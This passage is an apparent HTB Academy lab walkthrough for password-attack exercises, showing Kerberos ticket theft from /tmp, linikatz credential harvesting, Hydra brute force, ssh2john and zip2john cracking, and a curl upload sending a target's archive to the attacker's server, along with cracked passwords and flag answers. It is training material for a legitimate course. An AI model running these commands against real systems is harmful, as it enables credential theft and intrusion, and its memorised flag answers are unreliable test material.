-rw-r--r-- 1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb  220 Oct  6  2022 .bash_logout
-rw-r--r-- 1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 3771 Oct  6  2022 .bashrc
drwx------ 2 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 4096 Oct  6  2022 .cache
-rw-r--r-- 1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb   23 Oct 12  2022 flag.txt
-rw-r--r-- 1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb  807 Oct  6  2022 .profile
-rw------- 1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb  732 Oct 12  2022 .viminfo
svc_workstations@inlanefreight.htb@linux01:~$ cat flag.txt 
Mor3_4cce$$_m0r3_Pr1v$
```

39. Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.

Simply use `sudo -l ` when you want to list the privileges of the user
```c
svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
svc_workstations@inlanefreight.htb@linux01:~$ sudo su
root@linux01:/home/svc_workstations@inlanefreight.htb# cat /root/flag.txt
Ro0t_Pwn_K3yT4b

```


40. Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.

Once we are logged in as root we need to try the next commands to find the file ccache file for julio user to use it for connection to smbshares and getting flag:
```c
root@linux01:~# ls -la /tmp
total 76
drwxrwxrwt 13 root                               root                           4096 Oct 21 14:40 .
drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
drwxrwxrwt  2 root                               root                           4096 Oct 21 13:01 .font-unix
drwxrwxrwt  2 root                               root                           4096 Oct 21 13:01 .ICE-unix
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Oct 21 14:40 krb5cc_647401106_0lSM4w
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct 21 14:40 krb5cc_647401106_HRJDux
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct 21 13:03 krb5cc_647401107_OiQT5o
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct 21 14:40 krb5cc_647401109_lmbWTI
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1746 Oct 21 14:40 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Oct 21 13:38 krb5cc_647402606_Ds2HO1
drwx------  3 root                               root                           4096 Oct 21 13:01 snap.lxd
drwx------  3 root                               root                           4096 Oct 21 13:01 systemd-private-2095d2270647494692ef7c827d3e8434-ModemManager.service-8If8qi
drwx------  3 root                               root                           4096 Oct 21 13:02 systemd-private-2095d2270647494692ef7c827d3e8434-systemd-logind.service-6kPWAi
drwx------  3 root                               root                           4096 Oct 21 13:01 systemd-private-2095d2270647494692ef7c827d3e8434-systemd-resolved.service-GvSjDf
drwx------  3 root                               root                           4096 Oct 21 13:01 systemd-private-2095d2270647494692ef7c827d3e8434-systemd-timesyncd.service-iaycQi
drwxrwxrwt  2 root                               root                           4096 Oct 21 13:01 .Test-unix
drwx------  2 root                               root                           4096 Oct 21 13:01 vmware-root_696-2722173465
drwxrwxrwt  2 root                               root                           4096 Oct 21 13:01 .X11-unix
drwxrwxrwt  2 root                               root                           4096 Oct 21 13:01 .XIM-unix
root@linux01:~# pwd
/root
root@linux01:~# cp /tmp/krb5cc_647401106_0lSM4w /root
root@linux01:~# ls
flag.txt  krb5cc_647401106_0lSM4w  snap
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_0lSM4w 
root@linux01:~# smbclient //DC01/julio -k
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 14 12:25:24 2022
  ..                                  D        0  Thu Jul 14 12:25:24 2022
  julio.txt                           A       17  Thu Jul 14 21:18:12 2022

		7706623 blocks of size 4096. 4459454 blocks available
smb: \> get julio.txt 
getting file \julio.txt of size 17 as julio.txt (8.3 KiloBytes/sec) (average 8.3 KiloBytes/sec)
smb: \> exit
root@linux01:~# ls
flag.txt  julio.txt  krb5cc_647401106_0lSM4w  snap
root@linux01:~# cat julio.txt 
JuL1()_SH@re_fl@g
```


41. Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).

For that we can use tool called `lilikatz.sh` it is a shell script tool used to automate the process of installing and running **Mimikatz** in Linux-based environments, particularly for penetration testing and post-exploitation tasks in **Active Directory** environments. So basically we need to use it to extract kerberos tickets and finding the location of them in the system as well
First I downloaded it from github to my attack machine, then started python server to transfer it to our target:
```c
┌─[us-academy-5]─[10.10.14.124]─[htb-ac-1052766@htb-gcc9lyrxtl]─[~/linikatz]
└──╼ [★]$ git clone https://github.com/CiscoCXSecurity/linikatz.git
┌─[us-academy-5]─[10.10.14.124]─[htb-ac-1052766@htb-gcc9lyrxtl]─[~/linikatz]
└──╼ [★]$ cd linikatz
┌─[us-academy-5]─[10.10.14.124]─[htb-ac-1052766@htb-gcc9lyrxtl]─[~/linikatz]
└──╼ [★]$ python3 -m http.server 5252
Serving HTTP on 0.0.0.0 port 5252 (http://0.0.0.0:5252/) ...
10.129.204.23 - - [21/Oct/2024 09:56:41] "GET /linikatz.sh HTTP/1.1" 200 -

```

Then on the target machine we transfer the script via curl command and use it to find the location of the keytab file
```c
root@linux01:~# curl http://10.10.14.124:5252/linikatz.sh -o linikatz.io
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 14210  100 14210    0     0  59208      0 --:--:-- --:--:-- --:--:-- 59208
root@linux01:~# ls
flag.txt  julio.txt  krb5cc_647401106_0lSM4w  linikatz.io  linikatz.sh  snap
root@linux01:~# chmod +x linikatz.sh 
root@linux01:~# ./linikatz.sh 
 _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   < (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

             =[ @timb_machine ]=

I: [freeipa-check] FreeIPA AD configuration
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
I: [sss-check] SSS AD configuration
-rw------- 1 root root 1609728 Oct 21 14:55 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct 21 13:01 /var/lib/sss/db/config.ldb
-rw------- 1 root root 4154 Oct 21 14:50 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
-rw------- 1 root root 1609728 Oct 21 14:55 /var/lib/sss/db/cache_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  4  2022 /var/lib/sss/db/sssd.ldb
-rw-rw-r-- 1 root root 10406312 Oct 21 14:55 /var/lib/sss/mc/initgroups
-rw-rw-r-- 1 root root 6406312 Oct 21 14:55 /var/lib/sss/mc/group
-rw-rw-r-- 1 root root 8406312 Oct 21 14:55 /var/lib/sss/mc/passwd
-rw-r--r-- 1 root root 113 Oct 21 13:02 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
-rw-r--r-- 1 root root 40 Oct 21 13:02 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
-rw-r--r-- 1 root root 15 Oct 21 13:02 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
-rw-r--r-- 1 root root 12 Oct 21 14:55 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
-rw------- 1 root root 504 Oct  6  2022 /etc/sssd/sssd.conf
I: [vintella-check] VAS AD configuration
I: [pbis-check] PBIS AD configuration
I: [samba-check] Samba configuration
-rw-r--r-- 1 root root 8942 Oct  4  2022 /etc/samba/smb.conf
-rw-r--r-- 1 root root 8 Jul 18  2022 /etc/samba/gdbcommands
I: [kerberos-check] Kerberos configuration
-rw-r--r-- 1 root root 2800 Oct 21 13:02 /etc/krb5.conf
-rw------- 1 root root 2694 Oct 21 13:14 /etc/krb5.keytab
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 21 14:55 /tmp/krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Oct 21 14:55 /tmp/krb5cc_647401106_UAPtJp
-rw------- 1 david@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 21 13:03 /tmp/krb5cc_647401107_OiQT5o
-rw------- 1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct 21 14:55 /tmp/krb5cc_647401109_lmbWTI
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1746 Oct 21 14:55 /tmp/krb5cc_647402606
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct 21 13:38 /tmp/krb5cc_647402606_Ds2HO1
I: [samba-check] Samba machine secrets
I: [samba-check] Samba hashes
I: [check] Cached hashes
I: [sss-check] SSS hashes
./linikatz.sh: line 349: tdbdump: command not found
I: [check] Machine Kerberos tickets
I: [sss-check] SSS ticket list
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/21/2024 14:50:01  10/22/2024 00:50:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
.
.
.
SNIP
.
.
.

```

Then as we found the location of the keytab file we can copy it and export to use smbclient to download flag.txt as a result
```c
root@linux01:~# cp /var/lib/sss/db/ccache_INLANEFREIGHT.HTB /root
root@linux01:~# ls
ccache_INLANEFREIGHT.HTB  flag.txt  julio.txt  krb5cc_647401106_0lSM4w  linikatz.8366  linikatz.io  linikatz.sh  snap
root@linux01:~# export KRB5CCNAME=/root/ccache_INLANEFREIGHT.HTB
root@linux01:~# klist
Ticket cache: FILE:/root/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/21/2024 14:50:01  10/22/2024 00:50:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
	renew until 10/22/2024 14:50:01
10/21/2024 14:50:01  10/22/2024 00:50:01  ldap/dc01.inlanefreight.htb@
	renew until 10/22/2024 14:50:01
10/21/2024 14:50:01  10/22/2024 00:50:01  ldap/dc01.inlanefreight.htb@INLANEFREIGHT.HTB
	renew until 10/22/2024 14:50:01
root@linux01:~# smbclient //DC01/linux01 -k
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Oct  5 14:17:02 2022
  ..                                  D        0  Wed Oct  5 14:17:02 2022
  flag.txt                            A       52  Wed Oct  5 14:17:02 2022

		7706623 blocks of size 4096. 4459454 blocks available
smb: \> get flag.txt 
getting file \flag.txt of size 52 as flag.txt (25.4 KiloBytes/sec) (average 25.4 KiloBytes/sec)
smb: \> exit
root@linux01:~# ls
ccache_INLANEFREIGHT.HTB  flag.txt  julio.txt  krb5cc_647401106_0lSM4w  linikatz.8366  linikatz.io  linikatz.sh  snap
root@linux01:~# cat flag.txt 
Us1nG_KeyTab_Like_@_PRO
```


#### Protected files

42.  Use the cracked password of the user Kira and log in to the host and crack the "id_rsa" SSH key. Then, submit the password for the SSH key as the answer. 

As far as you remember, we already confronted with user Kira and found her password `LoveYou1` which is not working with ssh connection. So we can modify that password and make mutated list of it. First we will create file kirapass and simply insert the above password there:
```c
┌[parrot]─[23:30-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks]
└╼r3so1ve$nano kirapass       

LoveYou1
```

Then we need to apply custom.rule for it to mutate. The custom rule and 2 another files of usernames and passwords, can be downloaded by clicking resources button on the top of the page of the password attacks modules. Then we need to use hydra with already made mutated passwords to bruteforce ssh service
```c
┌[parrot]─[23:31-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks]
└╼r3so1ve$hashcat --force kirapass -r custom.rule --stdout | sort -u > kira-mutated-passwords 
┌[parrot]─[23:32-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks]
└╼r3so1ve$hydra -l kira -P kira-mutated-passwords -u 10.129.29.149 ssh         
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-21 23:32:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 459 login tries (l:1/p:459), ~29 tries per task
[DATA] attacking ssh://10.129.29.149:22/
[22][ssh] host: 10.129.29.149   login: kira   password: L0vey0u1!
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-21 23:32:51
```

So we got new password: `L0vey0u1!` which we can use to ssh:
```c
┌[parrot]─[23:32-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks]
└╼r3so1ve$ssh kira@10.129.29.149
kira@10.129.29.149's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)
.
.
.
SNIP
.
.
.
kira@nix01:~$ 
```

Then we need to search for id_rsa, and it looks like it is encrypted:
```c
kira@nix01:~$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
/home/kira/.ssh/id_rsa:1:-----BEGIN RSA PRIVATE KEY-----
/lib/python3/dist-packages/twisted/conch/ssh/keys.py:1108:                               b' PRIVATE KEY-----'))]
/lib/python3/dist-packages/twisted/conch/ssh/keys.py:1144:                                   b' PRIVATE KEY-----')))
/lib/python3/dist-packages/twisted/conch/test/keydata.py:110:privateECDSA_openssh521 = b"""-----BEGIN EC PRIVATE KEY-----
/lib/python3/dist-packages/twisted/conch/test/keydata.py:116:-----END EC PRIVATE KEY-----"""
/lib/python3/dist-packages/twisted/conch/test/keydata.py:123:privateECDSA_openssh384 = b"""-----BEGIN EC PRIVATE KEY-----
/lib/python3/dist-packages/twisted/conch/test/keydata.py:128:-----END EC PRIVATE KEY-----"""
/lib/python3/dist-packages/twisted/conch/test/keydata.py:138:privateECDSA_openssh = b"""-----BEGIN EC PRIVATE KEY-----
/lib/python3/dist-packages/twisted/conch/test/keydata.py:142:-----END EC PRIVATE KEY-----"""
/lib/python3/dist-packages/twisted/conch/test/keydata.py:151:privateRSA_openssh = b'''-----BEGIN RSA PRIVATE KEY-----
/lib/python3/dist-packages/twisted/conch/test/keydata.py:177:-----END RSA PRIVATE KEY-----'''
/lib/python3/dist-packages/twisted/conch/test/keydata.py:183:privateRSA_openssh_alternate = b"""-----BEGIN RSA PRIVATE KEY-----
/lib/python3/dist-packages/twisted/test/key.pem.no_trailing_newline:1:-----BEGIN PRIVATE KEY-----
/lib/python3/dist-packages/Crypto/SelfTest/Signature/test_pkcs1_15.py:110:                """-----BEGIN RSA PRIVATE KEY-----
/lib/python3/dist-packages/Crypto/SelfTest/Signature/test_pkcs1_15.py:118:                -----END RSA PRIVATE KEY-----""",
```
- **`grep`**: This is the command being used to search for patterns in files.
- **`-r`**: This option tells `grep` to search recursively through directories and their subdirectories.  
- **`-n`**: This option tells `grep` to show the line numbers of matching lines in the output.
- **`-w`**: This option ensures that `grep` matches whole words only, meaning it will not match substrings within longer words.
- **`"PRIVATE KEY"`**: This is the pattern `grep` is searching for. In this case, it's looking for the exact phrase "PRIVATE KEY".
- **`/*`**: This specifies the starting point for the search. The `/*` means that `grep` will search through all files and directories in the root directory (`/`).
- **`2>/dev/null`**: This part redirects error messages (file descriptor 2) to `/dev/null`, effectively suppressing them. This is useful when you want to avoid cluttering the output with errors, such as "Permission denied" messages that can occur when trying to read certain directories or files.
- **`|`**: This is a pipe, which takes the output of the command on the left and uses it as input for the command on the right.
- **`grep ":1"`**: This second `grep` filters the output from the first `grep` command, looking for lines that contain ":1". This indicates that it is looking for matches that occur on the first line of files.

In summary, the command is searching through all files starting from the root directory for the phrase "PRIVATE KEY" and displays only those occurrences that are found on the first line of the matching files.

Then I cat the content of the file id_rsa
```c
kira@nix01:~$ cd .ssh
kira@nix01:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
kira@nix01:~/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,F1C2E21F3CF7BDF460FB56C7D16911F2

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
-----END RSA PRIVATE KEY-----

```

After that I simply copied this id_rsa to my attack machine and applied script to extract the hash of the password from the provided id_rsa file and then writes output to ssh.hash
```c
┌[parrot]─[23:48-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks/kira]
└╼r3so1ve$nano id_rsa        
┌[parrot]─[23:48-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks/kira]
└╼r3so1ve$python3 /usr/share/john/ssh2john.py id_rsa > ssh.hash
┌[parrot]─[23:49-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks/kira]
└╼r3so1ve$ls
total 8.0K
-rw-r--r-- 1 r3so1ve r3so1ve 2.5K Oct 21 23:48 id_rsa
-rw-r--r-- 1 r3so1ve r3so1ve 3.6K Oct 21 23:49 ssh.hash
```

Finally we use john to crack the ssh.hash
```c
┌[parrot]─[23:49-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks/kira]
└╼r3so1ve$john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
L0veme           (id_rsa)     
1g 0:00:00:03 DONE (2024-10-21 23:50) 0.3039g/s 645223p/s 645223c/s 645223C/s L112893..L0VE13
Use the "--show" option to display all of the cracked passwords reliably
```


#### Protected Archives

43. Use the cracked password of the user Kira, log in to the host, and read the Notes.zip file containing the flag. Then, submit the flag as the answer. 

We need to ssh to the system
```c
ssh kira@10.129.131.42
Password: L0vey0u1!
```

Then search for any archives
```c
for ext in $(echo ".zip .gzip* ");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/nul
```

Then I upload the archive to my attack machine , to crack it later with john:
```c
curl -X POST http://10.10.16.15:8000/upload -F 'files=@/home/kira/Documents/Notes.zip' --insecure
```

On the attacking machine I ran:
```c
python3 -m http.server 8000
```

After that I extract the hash , and try to crack it , the wordlist rockyou.txt don't work for me , for this I generate mutated wordlist from the password.txt from Resources
```c
zip2john Notes.zip > zip.hash  
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list  
john --wordlist=./mut_password.list zip.hash  
john zip.hash --show
```

I get the password , `P@ssw0rd3!` use it to open the archive , and get the flag `HTB{ocnc7r4io8ucsj8eujcm}`


## Skills Assessment
### Password Attacks Lab - Easy

44. Examine the first target and submit the root password as the answer.

First we got to examine the target by running nmap
```c
map -A 10.129.6.67 -Pn -oN easylabnmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 11:19 +05
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 64.68% done; ETC: 11:20 (0:00:21 remaining)
Nmap scan report for 10.129.6.67
Host is up (0.55s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.40 seconds

```

We see ssh and ftp ports open. I tried to login as anonymous to ftp, but it was not successful. Then I decided to use resources button to download the username.list and password.list to brute force the password for ftp.
```c
hydra -L username.list -P password.list ftp://10.129.6.67

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-22 11:23:52
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21112 login tries (l:104/p:203), ~1320 tries per task
[DATA] attacking ftp://10.129.6.67:21/
[STATUS] 222.00 tries/min, 222 tries in 00:01h, 20890 to do in 01:35h, 16 active
[STATUS] 226.67 tries/min, 680 tries in 00:03h, 20432 to do in 01:31h, 16 active
login:mike     password:7777777
```

After a bit waiting I found creds for user mike
```
mike:7777777
```

I tried to ssh with them, but it showed me that permission is denied. So we need id_rsa key. Then I decided to log in as mike to ftp with his password and that worked fine
```c
ftp -p 10.129.6.67
Connected to 10.129.6.67.
220 (vsFTPd 3.0.3)
Name (10.129.6.67:r3so1v3): mike
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||7755|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000          554 Feb 09  2022 authorized_keys
-rw-------    1 1000     1000         2546 Feb 09  2022 id_rsa
-rw-r--r--    1 1000     1000          570 Feb 09  2022 id_rsa.pub
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||52460|)
150 Opening BINARY mode data connection for id_rsa (2546 bytes).
100% |************************************************************************************************************************************************|  2546       13.51 KiB/s    00:00 ETA
226 Transfer complete.
2546 bytes received in 00:00 (3.10 KiB/s)
ftp> exit
221 Goodbye.

```

I found id_rsa and downloaded it to my machine to use it later. Don't forget to set the correct permissions
```c
chmod 600 id_rsa
```

So now we can log in to ssh with the id_rsa
```c
ssh mike@10.129.6.67 -i id_rsa 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 22 07:27:02 BST 2024

  System load:  0.0               Processes:               203
  Usage of /:   29.7% of 8.79GB   Users logged in:         0
  Memory usage: 10%               IPv4 address for ens192: 10.129.6.67
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

214 updates can be applied immediately.
165 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Feb  9 17:37:10 2022 from 10.129.202.64
mike@skills-easy:~$ ls -la
total 40
drwxr-xr-x 4 mike mike 4096 Feb 10  2022 .
drwxr-xr-x 3 root root 4096 Feb  9  2022 ..
-rw------- 1 mike mike 5900 Feb 10  2022 .bash_history
-rw-r--r-- 1 mike mike  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 mike mike 3771 Feb 25  2020 .bashrc
drwx------ 2 mike mike 4096 Feb  9  2022 .cache
-rw-r--r-- 1 mike mike  807 Feb 25  2020 .profile
drwx------ 2 mike mike 4096 Feb  9  2022 .ssh
-rw------- 1 mike mike 2859 Feb  9  2022 .viminfo

```

Now we managed to login to ssh and now can see the content of the bash_history file for some passwords and indeed find it
```c
mike@skills-easy:~$ pwd
/home/mike
mike@skills-easy:~$ cat .bash_history 
vim updater.bash
